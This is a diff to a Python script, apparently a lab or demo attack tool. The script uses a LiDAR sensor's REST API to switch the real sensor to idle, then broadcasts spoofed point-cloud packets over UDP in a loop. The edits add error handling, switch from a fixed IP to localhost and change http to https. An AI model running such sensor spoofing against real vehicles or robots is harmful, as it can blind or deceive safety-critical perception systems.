@@ -11,6 +11,7 @@ import argparse
 import requests
 import socket
 import time
+import threading
 
 
 def main():
@@ -22,14 +23,21 @@ def main():
     options = parser.parse_args()
 
     udp_port = 5044
+    ip_address = 'localhost'
 
-    # Chech the current status of the LiDAR (should be 'running')
-    response = requests.get('http://192.168.232.128:8007/mode/get')
-    print (response.text)
+    # Check the current status of the LiDAR (should be 'running')
+    try:
+        response = requests.get('https://%s:8007/mode/get' % ip_address)
+        print (response.text)
+    except:
+        print("Can't access LiDAR REST API")
 
     # Put the real LiDAR in idle mode which stops it from transmitting pointcloud packets
-    response = requests.get('http://192.168.232.128:8007/mode/set/idle')
-    print (response.text)
+    try:
+        response = requests.get('https://%s:8007/mode/set/idle' % ip_address)
+        print (response.text)
+    except:
+        print("Can't access LiDAR REST API")
 
     # Setup the UDP socket for broadcasting spoofed pointcloud packets
     udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -41,7 +49,7 @@ def main():
     count = 0
 
     while True:
-        udp_socket.sendto(b'Spoofed LiDAR Pointcloud packet: Message number %d\r\n' % count, ('<broadcast>', udp_port))
+        udp_socket.sendto(b'Spoofed LiDAR Pointcloud packet: Message number %d' % count, ('<broadcast>', udp_port))
         count += 1
         time.sleep(0.150)
 
